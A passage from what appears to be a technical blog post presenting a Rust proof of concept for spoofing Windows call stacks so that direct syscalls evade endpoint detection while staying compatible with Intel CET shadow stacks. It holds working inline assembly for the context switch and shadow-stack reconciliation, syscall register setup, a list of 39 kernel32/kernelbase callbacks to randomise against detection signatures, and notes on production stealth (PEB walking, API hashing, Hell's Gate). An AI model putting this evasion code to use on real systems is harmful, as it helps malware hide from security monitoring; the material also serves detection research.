`kernelbase!EnumSystemLocalesEx` and `kernelbase!Internal_EnumSystemLocales`.

```rust
#[inline(never)]
extern "system" fn manual_stack_unwind_enum() -> i32 {
```

Two critical attributes:

- `#[inline(never)]`: the function **must** have its own stack frame and a `RUNTIME_FUNCTION` entry in `.pdata`. Otherwise `RtlVirtualUnwind` can't unwind through it. I learned this the hard way.
- `extern "system"`: matches the Windows callback ABI. The actual `LOCALE_ENUMPROCEX` signature takes three parameters (locale string, flags, lparam), but since we ignore them all (we read our state from TEB instead), the zero-parameter declaration works fine. On x64 the caller cleans up, so the mismatch is harmless.

The callback retrieves the `EmbeddedContext` from `TEB+0x28`, validates via `magic`, restores the backed-up stack slots, increments `invoke_count`, then:

**First invocation (`invoke_count` == 1): set up the `syscall`**

Another `RtlCaptureContext` + `RtlVirtualUnwind` cycle, this time unwinding from inside the callback. The parent RIP now points into `kernelbase!Internal_EnumSystemLocales`.

```rust
unsafe { write_volatile(&raw mut (*context_record).Rax, u64::from(args.ssn)) };
unsafe { write_volatile(&raw mut (*context_record).Rip, args.trampoline    ) };
unsafe { write_volatile(&raw mut (*context_record).Rcx, args.arg1          ) };
unsafe { write_volatile(&raw mut (*context_record).R10, args.arg1          ) };
unsafe { write_volatile(&raw mut (*context_record).Rdx, args.arg2          ) };
unsafe { write_volatile(&raw mut (*context_record).R8,  args.arg3          ) };
unsafe { write_volatile(&raw mut (*context_record).R9,  args.arg4          ) };
```

`RAX` = `SSN`, `RIP` = trampoline, `RCX`/`R10` = arg1 (duplicated because the kernel reads from `R10`), `RDX`/`R8`/`R9` = args 2-4. Extra arguments (5+) go on the stack with a careful save-and-restore pattern to preserve original values for Phase 3.

The `real_return_address` from the unwind (pointing back into `Internal_EnumSystemLocales`) is placed at `[new_rsp]`. After the `syscall`, the trampoline's `ret` pops it and returns into the enum function's iteration loop, which thinks the callback returned normally.

At this point the `CONTEXT` record contains: `RAX` = `0x50` (SSN for `ZwProtectVirtualMemory` on Win10/11), `RIP` = the `syscall; ret` trampoline address inside `ntdll`, and `[new_rsp]` = the return address back into `Internal_EnumSystemLocales`. Everything is set for the context switch.

### 5.5 Phase 3: Cleanup

After the `syscall`, `ret` returns to `Internal_EnumSystemLocales`. What happens next depends on the `syscall`'s return value (see [7.2](#72-why-these-functions-work) for the full explanation).

In the **success case** (`STATUS_SUCCESS` = 0), the enum function interprets the return value as `FALSE` ("stop enumerating") and quits. The callback is never invoked again. Phase 3 doesn't run. This is the common path.

In the **failure case** (non-zero `NTSTATUS`), the enum function interprets it as `TRUE` ("keep going") and calls the callback again. Now, there's a subtlety: Phase 2 restored `TEB.ArbitraryUserPointer` to its original value *before* the context switch (we were done with the covert data channel). So when Phase 3 fires, `TEB+0x28` no longer points to our `EmbeddedContext`.

What happens? The callback reads `TEB+0x28`, gets either `NULL` (common) or the original value (rare). If `NULL`, it bails immediately with `return 0`. If non-null, the `magic` validation fails and it returns `0` anyway. Either way: the enumeration stops.

The stack slots overwritten with syscall arguments 5+ in the enum function's frame are **not** restored in this path. For the PoC (with 5 arguments), the only overwritten slot is in home space territory, which is scratch space the callee can trash freely. No harm done. For syscalls with more arguments, a more robust implementation would need to keep the TEB pointer alive through the syscall, or accept that the failure path may leave the enum function's frame slightly dirty before it unwinds.

### 5.6 `user_mode_continue`: CET-Compliant Context Switch

This is the heart of the whole thing. A full CPU state restoration + CET reconciliation in inline assembly. It's `#[inline(never)]`, a real function with its own frame and `.pdata` entry, and this is not incidental: it's what makes the CET reconciliation necessary and active (more on this in [Section 6](#6-cet-compliance-the-core-contribution)).

```rust
#[inline(never)]
fn user_mode_continue(context_record: *mut CONTEXT, new_rsp: u64) -> ! {
    unsafe {
        asm!(
            // --- CET shadow-stack reconciliation ---
            "xor rax, rax",
            ".byte 0xF3, 0x48, 0x0F, 0x1E, 0xC8",      // RDSSPQ rax - read SSP into RAX (0 if CET off)
            "test rax, rax",
            "jz 3f",                                   // CET off -> skip the scan

            "mov r9, 16",                              // max 16 entries to scan
            "2:",
            "mov r11, [rax]",                          // shadow-stack entry at current SSP
            "cmp r11, [r14]",                          // compare to expected return address at [new_rsp]
            "je 3f",                                   // matched -> SSP is aligned, done

            "mov ecx, 1",
            ".byte 0xF3, 0x48, 0x0F, 0xAE, 0xE9",      // INCSSPQ rcx - advance SSP by 1*8 = one 64-bit entry
            "add rax, 8",                              // track our mirror of SSP
            "dec r9",
            "jnz 2b",

            // --- Full CPU state restoration ---
            "3:",
            "mov rsp, r14",                            // RSP <- new_rsp

            "mov ebx, dword ptr [r15 + 0x44]",         // CONTEXT.EFlags
            "push rbx",
            "popfq",

            "mov rax, [r15 + 0x78]",                   // CONTEXT.Rax
            "mov rcx, [r15 + 0x80]",                   // CONTEXT.Rcx
            "mov rdx, [r15 + 0x88]",                   // CONTEXT.Rdx
            "mov rbx, [r15 + 0x90]",                   // CONTEXT.Rbx
            "mov rbp, [r15 + 0xA0]",                   // CONTEXT.Rbp
            "mov rsi, [r15 + 0xA8]",                   // CONTEXT.Rsi
            "mov rdi, [r15 + 0xB0]",                   // CONTEXT.Rdi
            "mov r8,  [r15 + 0xB8]",                   // CONTEXT.R8
            "mov r9,  [r15 + 0xC0]",                   // CONTEXT.R9
            "mov r10, [r15 + 0xC8]",                   // CONTEXT.R10
            "mov r11, [r15 + 0xF8]",                   // CONTEXT.Rip -> indirect jump target
            "mov r12, [r15 + 0xD8]",                   // CONTEXT.R12
            "mov r13, [r15 + 0xE0]",                   // CONTEXT.R13

            "ldmxcsr dword ptr [r15 + 0x34]",          // CONTEXT.MxCsr
            "movdqa xmm6,  [r15 + 0x200]",             // CONTEXT.Xmm6..Xmm15 (non-volatile per Win64 ABI)
            "movdqa xmm7,  [r15 + 0x210]",
            "movdqa xmm8,  [r15 + 0x220]",
            "movdqa xmm9,  [r15 + 0x230]",
            "movdqa xmm10, [r15 + 0x240]",
            "movdqa xmm11, [r15 + 0x250]",
            "movdqa xmm12, [r15 + 0x260]",
            "movdqa xmm13, [r15 + 0x270]",
            "movdqa xmm14, [r15 + 0x280]",
            "movdqa xmm15, [r15 + 0x290]",

            "mov r14, [r15 + 0xE8]",                   // CONTEXT.R14
            "mov r15, [r15 + 0xF0]",                   // CONTEXT.R15 (must be last - r15 was our base ptr)

            "jmp r11",                                 // resume at CONTEXT.Rip - NOT ret!

            in("r14") new_rsp,
            in("r15") context_record,
            options(noreturn)
        );
    }
}
```

The function takes `new_rsp` in `R14` and the `CONTEXT` pointer in `R15`. It restores all 16 general-purpose registers, `EFLAGS`, `MXCSR`, and `XMM6-XMM15` (the non-volatile `SIMD` registers per the Windows x64 ABI).

`R14` and `R15` are restored last because they're used as base pointers during the entire restoration sequence. The jump target (`CONTEXT.Rip`) is loaded into `R11` early and used at the end.

**Why `#[inline(never)]` and not `#[inline(always)]`:**

Here's the thing. If `user_mode_continue` were inlined, the compiler would paste the assembly directly into the caller. No `call` instruction, no return address pushed to the shadow stack. The CET reconciliation loop would compare `[SSP]` with `[new_rsp]`, find a match on the first iteration, and `INCSSPQ` would never fire. **It would have worked anyway**, but the reconciliation would be dead code.

By making `user_mode_continue` a real function (`#[inline(never)]`), the caller emits a `call user_mode_continue` instruction. That `call` pushes a return address onto the shadow stack. Since we `jmp` away instead of `ret`-ing, that entry becomes stale. Now `INCSSPQ` has actual work to do: it must advance the SSP past that stale entry to realign the two stacks.

Both approaches produce correct behavior. The difference is whether CET reconciliation is active (inline never) or passive (inline always). I chose the active path because it makes the CET compliance mechanism a load-bearing part of the architecture rather than a theoretical safety net that never fires. If you're going to write CET reconciliation code, it should actually reconcile something.

**A note of honesty about this choice:**

Let me be upfront: in this specific PoC, the `#[inline(never)]` is a deliberate forcing move. The minimal call chain (enum callback → `user_mode_continue` → `jmp`) would work fine with inlining, and the shadow stack would stay naturally aligned without any `INCSSPQ`. A reader could look at this and say: *you manufactured a problem that doesn't exist, just to demonstrate the fix.*

Fair criticism. But the reconciliation loop is not designed for this PoC's trivial one-function-deep case. It exists for production scenarios where the **diverging call chain** (the sequence of nested non-returning calls from the callback down to the final `jmp`) has depth greater than 1. What creates stale shadow stack entries is not every `call` instruction, but specifically calls to functions that *never return* because they transitively reach `user_mode_continue`'s `jmp`. Each such non-returning call leaves its return address permanently on the shadow stack. Some concrete examples:

- **Non-returning wrappers and abstraction layers.** In any well-structured codebase, `user_mode_continue` wouldn't be called naked from the callback. You'd have a dispatcher function selecting the syscall strategy, a module-level API that wraps the raw assembly, or both. If the callback calls a `prepare_and_execute()` function which in turn calls `user_mode_continue`, that's 2 stale entries (one per non-returning `call`). Add a trait implementation or module boundary and you're at 3. Normal code organization makes this inevitable.
- **Dynamic dispatch.** If the context switch sits behind a trait object, a vtable, or a function pointer (e.g., to select between CET and non-CET paths at runtime), the indirect `call` adds a frame in the diverging chain. That's one more stale entry you didn't write in your source.
- **Variable depth depending on code paths.** If different branches of your code reach the `jmp` through different numbers of non-returning intermediaries (fast path: 1 wrapper; error/retry path: 2 wrappers), the stale entry count varies at runtime. The loop (scanning up to 16) handles this without requiring you to know the exact count at compile time.
- **Integration with sleep obfuscation.** Combined with timer-based obfuscation (ThreadStackSpoofer-style), the context restoration happens from within the sleep API's callback chain. The exact depth of accumulated non-returning frames depends on where the timer fired and how deep the sleep implementation was at that point. The reconciliation loop handles the variable depth naturally.

In any of these scenarios, `INCSSPQ` fires for real. Without it, `#CP` fault, process dead, no second chance. The PoC uses `#[inline(never)]` to put this path under controlled load, so I can verify it works correctly in a debuggable environment before relying on it in contexts where the stale entries appear naturally and diagnosing a CET fault is significantly harder.

**About AlignedContext:**

You'll notice the code uses `AlignedContext` instead of a bare `CONTEXT`:

```rust
#[repr(C, align(16))]
struct AlignedContext(CONTEXT);
```

This is not cosmetic. The `movdqa` instruction (used for XMM register restoration) requires 16-byte aligned memory. If the `CONTEXT` structure isn't aligned to 16 bytes, `movdqa` raises a `#GP` (General Protection) fault and your process dies. Rust doesn't guarantee 16-byte alignment for the `CONTEXT` struct by default, so the wrapper forces it. If you try to reimplement this without the alignment wrapper, you'll get seemingly random crashes that are incredibly annoying to debug. Ask me how I know.

The final instruction is `jmp r11`, not `ret`. This is the key to CET compliance (explained in [Section 6](#6-cet-compliance-the-core-contribution)).

### 5.7 A Note on `RAX`: You Can't Get It Back

There's an inherent limitation of this technique that's worth highlighting: you cannot recover the `syscall`'s return value (`RAX`).

Here's why. After the `syscall` executes, `RAX` contains the `NTSTATUS` result. Then `ret` from the trampoline returns to `Internal_EnumSystemLocales`. At that point, the enum function's code runs, overwrites `RAX` with its own internal values, and by the time our callback gets invoked again (if it does), the original `NTSTATUS` is long gone.

So how do you know if the `syscall` succeeded? You use sentinel values. In the PoC, the `old_protect` variable is initialized to `0xFFFFFFFF` before the call:

```rust
let mut old_protect = 0xFFFF_FFFFu32;
```

If `ZwProtectVirtualMemory` succeeds, the kernel writes the actual old protection value into `old_protect` (through the pointer we passed as `arg5`). After the thread pool work completes, we check:

```rust
if old_protect == 0xFFFF_FFFF {
    // Still sentinel → syscall didn't write to it → something went wrong
    return Err(-1);
}
Ok(old_protect)
```

This pattern works for any `syscall` that writes to an output buffer. For syscalls that don't produce output, you need to get creative with other observable side effects. Not ideal, but it's the tradeoff we make for a fully spoofed call stack.

---

## 6. CET Compliance: The Core Contribution

### 6.1 Why Traditional Spoofing Breaks Under CET

You write a fake return address to `[RSP]`. The CPU executes `ret`, pops from both stacks, compares:

```
Normal stack:  [fake_addr]   ← what you wrote
Shadow stack:  [real_addr]   ← what the CPU wrote on CALL

fake_addr != real_addr → #CP fault → crash
```

The shadow stack is hardware-protected. You can't write to it with `mov`. It's over for traditional spoofing.

### 6.2 `JMP` Instead of RET

My context switch uses `jmp r11` instead of `ret`.

`JMP` doesn't touch the shadow stack at all. No pop from either stack, no comparison. CET is simply not involved. At the moment of context switch, the shadow stack check is completely bypassed.

But the shadow stack still has stale entries from the call chain that led to `user_mode_continue`. If I don't deal with them, the first `ret` in the jumped-to code will find a mismatched entry. That's where reconciliation comes in.

### 6.3 Shadow Stack Pointer Reconciliation

Because `user_mode_continue` is `#[inline(never)]`, the `call` that enters it pushes a return address onto the shadow stack. We never `ret` from it (we `jmp`), so that entry is stale. If we don't consume it, the first `ret` after the jump (in the trampoline or the enum function) will find a mismatch between the normal stack and the shadow stack. `#CP` fault. Dead.

The reconciliation loop advances the SSP until it lines up with what's on the normal stack:

```
1. `RDSSPQ rax`        → Read current SSP into RAX (0 if CET is off)
2. If `RAX` == 0       → CET disabled, skip (technique works on both)
3. Loop (up to 16 iterations):
   a. Read shadow stack entry at `[RAX]`
   b. Compare to expected return address at `[new_rsp]`
   c. Match → done, `SSP` is aligned
   d. No match → `INCSSPQ` 1 to skip past the stale entry (advances by 8 bytes)
   e. `RAX += 8`, repeat
```

In practice, the loop fires exactly once per context switch: it skips the one stale entry left by the `call user_mode_continue`, then finds the target return address (from `RtlVirtualUnwind`) which matches `[new_rsp]`. Done.

**Phase 1**

When `user_mode_continue` starts executing, the normal stack (`RSP`) has not been shifted yet. The Shadow Stack Pointer (`SSP`) naturally points to the return address left by the `call user_mode_continue` instruction (in this case, back into `thread_pool_worker_enum`). You can see this stale entry at the top of the shadow stack:

<p align="center">
    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/phase_1_ssp_before_incsspq.png" alt="Phase 1: Shadow stack before reconciliation">
    <br>
    <em>Phase 1: Shadow stack before reconciliation</em>
</p>

However, our forged context (`new_rsp`) expects to return directly to `TppWorkpExecuteCallback`. The reconciliation loop compares the SSP entries against our target and executes `INCSSPQ`. This advances the SSP by 8 bytes, skipping the stale entry and aligning the shadow stack with our intended return address:

<p align="center">
    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/phase_1_ssp_after_incsspq.png" alt="Phase 1: Shadow stack after reconciliation">
    <br>
    <em>Phase 1: Shadow stack after reconciliation</em>
</p>

**Phase 2**

The exact same mechanics apply during the second context switch. The `call user_mode_continue` from inside the enum callback pushes a return address (`manual_stack_unwind_enum+0x329`) onto the shadow stack. Since we are going to `jmp` to the syscall trampoline instead of returning, this entry is stale:

<p align="center">
    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/phase_2_ssp_before_incsspq.png" alt="Phase 2: Shadow stack before reconciliation">
    <br>
    <em>Phase 2: Shadow stack before reconciliation</em>
</p>

The reconciliation loop finds the discrepancy and advances the SSP. The shadow stack now perfectly matches our forged target (`Internal_EnumSystemLocales+0x348`), ready for the syscall's `ret` instruction to pop it without raising a `#CP` fault:

<p align="center">
    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/phase_2_ssp_after_incsspq.png" alt="Phase 2: Shadow stack after reconciliation">
    <br>
    <em>Phase 2: Shadow stack after reconciliation</em>
</p>

After the syscall is successfully executed, `ZwProtectVirtualMemory` correctly returns to `Internal_EnumSystemLocales`, proving that the callstack and the shadow stack are perfectly aligned with each other:

<p align="center">
    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/ssp_vs_cs_after_syscall.png" alt="Shadow stack vs Normal stack after syscall">
    <br>
    <em>Shadow stack vs Normal stack after syscall</em>
</p>

**An alternative that also works:** if you make `user_mode_continue` `#[inline(always)]`, there's no `call` instruction and no stale entry. The shadow stack is already aligned because `RtlVirtualUnwind` produces the exact same return addresses that the CPU pushed during the real `CALL` chain. The reconciliation loop compares, finds a match on the first iteration, and `INCSSPQ` never fires. Both paths are CET-compliant; the difference is whether the reconciliation is active or passive.

In this PoC specifically, `#[inline(never)]` artificially introduces the stale entry to exercise the reconciliation under controlled conditions. But in any non-trivial implementation (helper functions, compiler-generated calls, dynamic dispatch between the unwind and the context switch), those stale entries appear naturally and the loop becomes structurally mandatory. See the full discussion in [Section 5.6](#56-user_mode_continue-cet-compliant-context-switch).

Also, if CET is disabled, `RDSSPQ` returns 0, the loop is skipped, everything works. Same binary runs on CET and non-CET systems.

### 6.4 Build Configuration for CET

The PoC compiles with maximum CET strictness:

```toml
# .cargo/config.toml
[target.x86_64-pc-windows-msvc]
rustflags = [
    "-C", "control-flow-guard=yes",
    "-C", "link-arg=/CETCOMPAT",
    "-C", "link-arg=/force:guardehcont",
    "-C", "link-arg=/guard:ehcont",
    # "-Z", "ehcont-guard",  # requires nightly; uncomment if using rustc nightly
    "-C", "link-arg=/DYNAMICBASE",
    "-C", "link-arg=/NXCOMPAT",
    "-C", "link-arg=/HIGHENTROPYVA",
]
```

`/CETCOMPAT` marks the binary as CET-compatible. `/guard:ehcont` enables EH continuation metadata, and `/force:guardehcont` tells the linker to emit it even if some object files lack it. The `-Z ehcont-guard` flag is a Rust compiler option that generates the EH continuation table at the LLVM level, but it's a nightly-only `-Z` flag, so it's disabled by default. The PoC works fine without it; the linker-level flags are sufficient for CET enforcement. If you're on nightly, uncomment it for the full belt-and-suspenders treatment.

If the technique had a CET bug, the process would crash during testing. It doesn't.

<p align="center">
    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/PE_DLL_Characteristics.png" alt="PE DLL Characteristics">
    <br>
    <em>PE DLL Characteristics</em>
</p>

---

## 7. The 39 Enum Functions

### 7.1 The Complete List

I identified 39 callback-accepting functions across `kernel32.dll` and `kernelbase.dll` suitable as signed middle frames. In the PoC, only `EnumSystemLocalesEx` is used for simplicity, but in a real implementation these can be selected randomly at each `syscall` invocation to prevent stable stack fingerprints and thus significantly increase runtime polymorphism.

| # | Function | Module |
|---|---|---|
| 1 | `EnumUILanguagesA` | kernel32 / kernelbase |
| 2 | `EnumUILanguagesW` | kernel32 / kernelbase |
| 3 | `EnumSystemLanguageGroupsA` | kernel32 / kernelbase |
| 4 | `EnumSystemLanguageGroupsW` | kernel32 / kernelbase |
| 5 | `EnumLanguageGroupLocalesA` | kernel32 / kernelbase |
| 6 | `EnumLanguageGroupLocalesW` | kernel32 / kernelbase |
| 7 | `EnumResourceTypesA` | kernel32 / kernelbase |
| 8 | `EnumResourceTypesW` | kernel32 / kernelbase |
| 9 | `EnumResourceTypesExA` | kernel32 / kernelbase |
| 10 | `EnumResourceTypesExW` | kernel32 / kernelbase |
| 11 | `EnumResourceNamesA` | kernel32 / kernelbase |
| 12 | `EnumResourceNamesW` | kernel32 / kernelbase |
| 13 | `EnumResourceNamesExA` | kernel32 / kernelbase |
| 14 | `EnumResourceNamesExW` | kernel32 / kernelbase |
| 15 | `EnumResourceLanguagesA` | kernel32 / kernelbase |
| 16 | `EnumResourceLanguagesW` | kernel32 / kernelbase |
| 17 | `EnumResourceLanguagesExA` | kernel32 / kernelbase |
| 18 | `EnumResourceLanguagesExW` | kernel32 / kernelbase |
| 19 | `EnumCalendarInfoA` | kernel32 / kernelbase |
| 20 | `EnumCalendarInfoW` | kernel32 / kernelbase |
| 21 | `EnumCalendarInfoExA` | kernel32 / kernelbase |
| 22 | `EnumCalendarInfoExW` | kernel32 / kernelbase |
| 23 | `EnumCalendarInfoExEx` | kernel32 / kernelbase |
| 24 | `EnumDateFormatsA` | kernel32 / kernelbase |
| 25 | `EnumDateFormatsW` | kernel32 / kernelbase |
| 26 | `EnumDateFormatsExA` | kernel32 / kernelbase |
| 27 | `EnumDateFormatsExW` | kernel32 / kernelbase |
| 28 | `EnumDateFormatsExEx` | kernel32 / kernelbase |
| 29 | `EnumSystemCodePagesA` | kernel32 / kernelbase |
| 30 | `EnumSystemCodePagesW` | kernel32 / kernelbase |
| 31 | `EnumSystemGeoID` | kernel32 / kernelbase |
| 32 | `EnumSystemGeoNames` | kernel32 / kernelbase |
| 33 | `EnumSystemLocalesA` | kernel32 / kernelbase |
| 34 | `EnumSystemLocalesW` | kernel32 / kernelbase |
| 35 | `EnumSystemLocalesEx` | kernel32 / kernelbase |
| 36 | `EnumTimeFormatsA` | kernel32 / kernelbase |
| 37 | `EnumTimeFormatsW` | kernel32 / kernelbase |
| 38 | `EnumTimeFormatsEx` | kernel32 / kernelbase |
| 39 | `InitOnceExecuteOnce` | kernelbase |

### 7.2 Why These Functions Work

These functions share a property that makes them perfect for this technique: they stop enumeration when the callback returns `0`.

Here's the trick. When the `syscall` executes through the trampoline, `RAX` ends up holding the `NTSTATUS` result. Then `ret` returns to `Internal_EnumSystemLocales` (or equivalent), which looks at `EAX` as if it were the callback's return value.

NT syscalls return `STATUS_SUCCESS` on success. Guess what `STATUS_SUCCESS` is? Zero.

And what does the enum function do when the callback returns `0`? It interprets it as `FALSE` ("stop enumerating") and quits.

So in the success case: `syscall` returns `0`, enum function stops, callback called only once, done. Clean, efficient, no extra invocations.

In the failure case: `syscall` returns some non-zero `NTSTATUS`, enum function interprets it as `TRUE` ("keep going"), calls the callback again. That second invocation is Phase 3, which forcefully returns `0` to stop.

This alignment between `NTSTATUS` success and the callback's "stop" value is not a coincidence. It's precisely why I selected these 39 functions: they all respect this convention.

### 7.3 Not All Functions Support All Syscall Argument Counts

Here's something that cost me a lot of time and sanity to figure out.

When we set up the `syscall` in Phase 2, arguments 5 through 11 go on the stack, in the area that currently belongs to the enum function's own stack frame. We're literally overwriting memory that the enum function might be actively using.

Now, each enum function has a different prologue. Some allocate more stack space than others. If our `syscall` has, say, 10 arguments, we're writing to stack slots `[RSP+0x28]` through `[RSP+0x78]`. If the enum function only allocated enough space for its own 3 local variables, we just overwrote its locals, its saved registers, or who knows what else. Crash.

So not every enum function can support every `syscall` argument count. In the full implementation (not the PoC), each function is profiled at runtime to determine the maximum number of `syscall` arguments it can safely support. The profiler works like this:

1. Call the enum function with a special naked callback
2. The callback captures the return address and the `RSP` at entry
3. Walk back through the call stack with `RtlVirtualUnwind` to measure how many bytes the enum function's prologue allocated on the stack
4. Divide by 8 to get the number of 8-byte slots available
5. Clamp the result against a per-function safe maximum, determined empirically by testing across multiple Windows builds; the final `max_args` is the smaller of the two values

The result is a `max_args` value for each function. When dispatching a `syscall`, the dispatcher picks a random enum function from those whose `max_args` is at least as large as the `syscall`'s argument count.

For example, `EnumSystemCodePagesA` might support up to 5 arguments, while `EnumResourceLanguagesW` supports up to 11 (actually, it might even be more than 11, but I've never tested this code with system calls that require more than 11 parameters). A `syscall` with 10 arguments can only use the latter.

This profiling has to be done on each Windows build, because the amount of stack space each function allocates can change between releases as Microsoft recompiles the code. I have tested this across multiple Windows versions from Win8 onward, and let me tell you, it was not a fun experience. More on this in [Section 8.1](#81-the-enum-function-crashes).

### 7.4 A Note on `InitOnceExecuteOnce`

The attentive reader will have noticed that `InitOnceExecuteOnce` is not, strictly speaking, an "Enum" function. It doesn't enumerate anything. It's a one-shot initialization primitive: it calls your callback exactly once (if the `INIT_ONCE` block hasn't been initialized yet) and never calls it again.

So why is it in the list? Because it satisfies all the same requirements:

1. It accepts a callback pointer
2. It calls the callback at least once (assuming the `INIT_ONCE` block is fresh, which we ensure
   by zeroing it before each use)
3. When the callback returns `0` (`FALSE`), it treats the initialization as failed and doesn't do
   anything weird
4. It lives in `kernelbase.dll`
5. It creates a legitimate frame on the call stack

Its calling convention is slightly different (the callback receives an `LPINIT_ONCE` pointer, a parameter, and a context pointer), but since we only care about the stack frame it creates and not about its actual semantics, it works just fine as a trampoline.

Including non-Enum functions that satisfy the requirements is deliberate: the more diverse the pool, the harder it is to build a detection signature.

### 7.5 Why Not `user32.dll`?

`user32.dll` has plenty of enum functions too: `EnumWindows`, `EnumDesktopWindows`,
`EnumDisplayMonitors`, etc. I intentionally excluded them because `user32.dll` is not loaded by default in every process.

Console applications, services, and most non-GUI programs don't have `user32.dll` in their address space. Loading it with `LoadLibrary` would be a suspicious, monitorable event. By sticking to `kernel32.dll` and `kernelbase.dll`, which are always loaded, I avoid that problem.

---

## 8. The Debugging Nightmare

I'd be lying if I said this worked on the first try. Let me share some of the pain, because if you try to implement something similar, you'll likely run into the same walls.

### 8.1 The Enum Function Crashes

The first version of the full implementation (not the PoC) used a hardcoded table of "safe" argument counts per enum function. As soon as I tested on a different Windows build, half the functions started crashing.

The problem: Microsoft recompiles these functions between releases, and the prologue might allocate a different amount of stack space. A function that happily supported 8 `syscall` arguments on Windows 10 21H2 would crash on 22H2 because it now allocates 16 fewer bytes in its prologue. My 8th argument was overwriting a saved register.

The fix was a two-layer approach. The runtime profiler I described in [7.3](#73-not-all-functions-support-all-syscall-argument-counts) measures each function's available stack space at startup. But the profiler's result alone isn't trusted blindly, it's clamped against a per-function safe maximum that I determined empirically by testing across every supported Windows build (≥ 8 and Server ≥ 2012). The final `max_args` is the smaller of the two values.

Finding those empirical caps was the painful part. Every time I thought I had the right values, a different build would break a function I assumed was safe. The profiler handles the dynamic side (it adapts if a future Windows build changes a prologue), while the empirical caps act as a safety net to catch cases the profiler can't see.

### 8.2 The Thread Pool Crashes

Even after the enum function profiling was working, I kept getting crashes in the thread pool internals. The worker would execute, the enum callback would run, the `syscall` would succeed... and then the process would die on its way back to `TppWorkpExecute`.

The culprit: incorrect stack restoration. In Phase 1, when I redirect execution to the enum function, I overwrite three stack slots (at `RSP+0x20`, `RSP+0x28`, `RSP+0x30`) with the enum function's 5th/6th/7th arguments. These slots belong to the thread pool worker's caller (the internal TP code). When the enum function returns and the TP code tries to read its own local state from those positions, it finds my zeroes instead. Crash.

The fix is what you see in the enum callback's preamble: at the very beginning, before doing anything else, restore those three slots to their original values. The values were backed up in Phase 1 (`backup_addr/val_arg5/6/7`). The restore is idempotent: after restoring, the backup address is set to `0` so a second invocation doesn't double-write.

```rust
if args.backup_addr_arg5 != 0 {
    unsafe { write_volatile(args.backup_addr_arg5 as *mut u64, args.backup_val_arg5) };
    args.backup_addr_arg5 = 0;
}

if args.backup_addr_arg6 != 0 {
    unsafe { write_volatile(args.backup_addr_arg6 as *mut u64, args.backup_val_arg6) };
    args.backup_addr_arg6 = 0;
}

if args.backup_addr_arg7 != 0 {
    unsafe { write_volatile(args.backup_addr_arg7 as *mut u64, args.backup_val_arg7) };
    args.backup_addr_arg7 = 0;
}
```

This was one of those bugs where the crash happened in system code (the TP internals), the debugger showed a corrupted frame, and there was zero indication of what went wrong. It took me days of staring at hex dumps of the stack to figure out which bytes were being clobbered and by whom.

### 8.3 The 8-Byte Offset That Ruined My Week

This one is embarrassing in hindsight, but it drove me crazy at the time.

When I first wrote the stack slot backup code in Phase 1, I calculated the positions using `sp_orig` (which is `new_rsp`, i.e., the parent's RSP minus 8). So:

```rust
sp_orig.add(4) = new_rsp + 0x20 = (parent_rsp - 8) + 0x20 = parent_rsp + 0x18
```

But wait. The return address is at `[new_rsp]`. That means from the callee's (enum function's) perspective, the home space starts at `[RSP+0x08]`, not `[RSP+0x00]`. Everything is shifted by 8 bytes because of the return address I manually placed on the stack.

So what I thought was the "5th parameter position" was actually the 4th parameter's home space. I was backing up and restoring the wrong slots. The enum function would trash the real 5th slot (which I hadn't backed up), and the TP code would crash on return.

Once I realized the offset was wrong, the fix was simple. But finding it? I had a stack full of numbers that were "almost right" and a crash that didn't happen until the code was 3 function calls deep in the TP internals. I must have looked at hex dumps of the stack for an entire week before I noticed the 8-byte discrepancy.

The moral of the story: when you're manually building stack frames, off-by-one means off-by-eight on x64. And off-by-eight means your code works 90% of the time but crashes in the other 10% with no obvious pattern.

### 8.4 `INCSSPD` vs `INCSSPQ`: The 4-Byte Misalignment

This one wins the award for "most bytes of damage per character of source code." One missing byte in an opcode. Weeks of confusion.

The original implementation used `INCSSPD` (the 32-bit variant) to advance the shadow stack pointer:

```rust
.byte 0xF3, 0x0F, 0xAE, 0xE9    // INCSSPD ecx, advances SSP by ecx × 4 bytes
```

On x64, shadow stack entries are 8 bytes. `INCSSPD` with `ecx=1` advances by 4 bytes, half an entry. The SSP ends up pointing to the *middle* of a return address. Every subsequent read from the shadow stack is garbage. The next `ret` compares the real return address against the upper 4 bytes of one entry concatenated with the lower 4 bytes of the next. `#CP` fault. Process dead.

The fix is one byte, the REX.W prefix (`0x48`), to switch to the 64-bit variant:

```rust
.byte 0xF3, 0x48, 0x0F, 0xAE, 0xE9    // INCSSPQ rcx, advances SSP by rcx × 8 bytes
```

The reason this bug survived so long: the original `user_mode_continue` was `#[inline(always)]`. With inlining, there's no `call` instruction, no stale shadow stack entry, and the `INCSSPQ` loop never fires. The bug was latent, structurally present but never executed. When I switched to `#[inline(never)]` (to make the CET reconciliation active), the loop finally ran, and the 4-byte misalignment immediately manifested as a `STATUS_STACK_BUFFER_OVERRUN` (fast-fail code `0x39`) at the trampoline's `ret`.

The exception was at `ntdll!NtProtectVirtualMemory+0x14` (the `ret` after `syscall`). The callstack was perfect, every frame from a signed module. But the shadow stack was misaligned by 4 bytes, and CET didn't care how pretty the normal stack looked.

<p align="center">
    <img loading="lazy" decoding="async" src="/assets/img/cet-callstack-spoofing-thread-pool-trampoline/STATUS_STACK_BUFFER_OVERRUN.png" alt="STATUS STACK BUFFER OVERRUN">
    <br>
    <em>STATUS STACK BUFFER OVERRUN</em>
</p>

Intel's manual is clear about this if you read it carefully: `INCSSPD` uses `reg × 4` granularity, `INCSSPQ` uses `reg × 8`. On x64, always use `INCSSPQ`. There's no scenario where `INCSSPD` is correct for manipulating 64-bit shadow stack entries. I should have caught this from the opcode encoding alone. I didn't. Now you know.

---

## 9. About This PoC

### 9.1 What Is Intentionally Simplified

The PoC is intentionally simplified to keep the focus on the spoofing technique and CET compliance. Several things are deliberately done in a non-stealth way:

| Aspect | PoC approach | Production approach |
|---|---|---|
| **Module resolution** | `GetModuleHandleW` + `GetProcAddress` | PEB walking, hash-based API resolution |
| **SSN resolution** | Hardcoded per-OS lookup table | Dynamic via stub parsing ([Hell's Gate](https://github.com/am0nsec/HellsGate), etc.) |
